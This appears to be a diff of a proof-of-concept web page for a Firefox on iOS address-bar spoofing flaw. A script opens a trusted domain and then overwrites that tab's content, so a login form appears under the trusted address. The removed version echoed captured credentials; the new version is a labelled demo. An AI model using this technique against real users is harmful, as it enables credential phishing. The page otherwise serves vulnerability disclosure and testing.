@@ -3,53 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox iOS URL Mismatch PoC</title>
+<title>Firefox iOS URL / Content Mismatch PoC</title>
 
 <script>
 function go() {
-    // Open trusted URL in new tab
-    var w = window.open('https://www.google.com:8080', '_blank');
+    // Open trusted domain in new tab
+    var w = window.open('https://firefox.com:8080', '_blank');
 
-    // Delay to allow navigation
+    // Allow navigation to complete
     setTimeout(function () {
         try {
-            // Overwrite document content
+            // Overwrite cross-origin document (should be blocked)
             w.document.open();
             w.document.write(`
-                <h1>Login</h1>
-                Email:<br>
-                <input id="email"><br><br>
-                Password:<br>
-                <input id="pass" type="password"><br><br>
+                <h2>Security Proof of Concept</h2>
 
-                <button onclick="
-                    alert(
-                        'Email: ' + document.getElementById('email').value +
-                        '\\nPass: ' + document.getElementById('pass').value
-                    )
-                ">
-                    Login
+                <p style="color:red;font-weight:bold;">
+                  ⚠️ DO NOT use real username or password.<br>
+                  This page is for security testing only.
+                </p>
+
+                <hr>
+
+                <h3>Login (Demo Only)</h3>
+                Email:<br>
+                <input placeholder="demo@example.com"><br><br>
+                Password:<br>
+                <input type="password" placeholder="demo123"><br><br>
+
+                <button onclick="alert('Demo login clicked — no data is sent');">
+                    Login (Demo)
                 </button>
 
-                <br><br>
+                <hr>
 
-                <button onclick="downloadFile()">Download Text File</button>
+                <p style="font-size:13px;color:#333;">
+                  Address bar shows a trusted domain (google.com),<br>
+                  but this content is fully attacker-controlled.
+                </p>
+
+                <p id="origin" style="font-size:12px;color:#555;"></p>
+
+                <script>
+                  document.getElementById('origin').innerText =
+                    'Actual document origin: ' + location.origin;
+                <\/script>
             `);
             w.document.close();
         } catch (e) {
-            console.log('Blocked:', e);
+            console.log('Blocked (expected in other browsers):', e);
         }
     }, 3000);
-}
-
-// Download helper
-function downloadFile() {
-    const fileUrl = 'https://www.example.com/path/to/your/file.txt';
-
-    var a = document.createElement('a');
-    a.href = fileUrl;
-    a.download = 'file.txt';
-    a.click();
 }
 </script>
 </head>
